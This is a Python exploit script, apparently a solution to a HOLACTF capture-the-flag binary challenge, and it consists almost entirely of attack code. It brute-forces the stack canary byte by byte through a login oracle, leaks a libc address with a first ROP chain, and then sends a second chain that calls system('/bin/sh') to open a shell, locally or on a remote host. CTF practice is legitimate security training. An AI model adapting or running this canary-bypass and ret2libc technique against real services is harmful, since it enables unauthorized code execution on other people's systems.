#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

# context.log_level = 'debug'
exe = context.binary = ELF('./chall', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
b *0x401533
b *0x40158B
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()

    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

# ==================== EXPLOIT ====================
p = start()

slna(b': ', 1)
sla(b'Enter your password:\n', b'\xff' + b'\x00')

guess = b''
for i in range(7):
    for byte in range(1, 256):
        payload = b'\xff' + guess + bytes([byte]) + b'\x00'
        slna(b': ', 1)
        sla(b'Enter your password:\n', payload)
        data = rl()[:-1]
        if b'Login successfully!' in data:
            guess += bytes([byte])
            slna(b': ', 2)
            sla(b'Enter your input:\n', b'\xff' + guess)
            break

canary = u64(b'\x00' + guess)
slog('canary @ %#x', canary)

if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
    pause()

slna(b': ', 2)
sla(b'Enter your input:\n', b'\x00' * (0x38) + p64(canary) + p64(0x404000+0x800) + p64(0x40101a) + p64(exe.plt.printf) + p64(exe.plt.puts) + p64(0x401385))

slna(b': ', 3)
libc.address = fixleak(rl()[:-1]) - 0x62050
slog('libc base @ %#x', libc.address)

slna(b': ', 1)
sla(b'Enter your password:\n', b'\xff' + b'\x00')

rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = pop_rdi + 1

slna(b': ', 2)
sla(b'Enter your input:\n', b'\x00' * (0x38) + p64(canary) + p64(0) + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh\x00'))) + p64(ret) + p64(libc.sym.system))
slna(b': ', 3)

interactive()
# HOLACTF{:3_HAv3_FuN_8rUTE_359bcb9b0bcf}
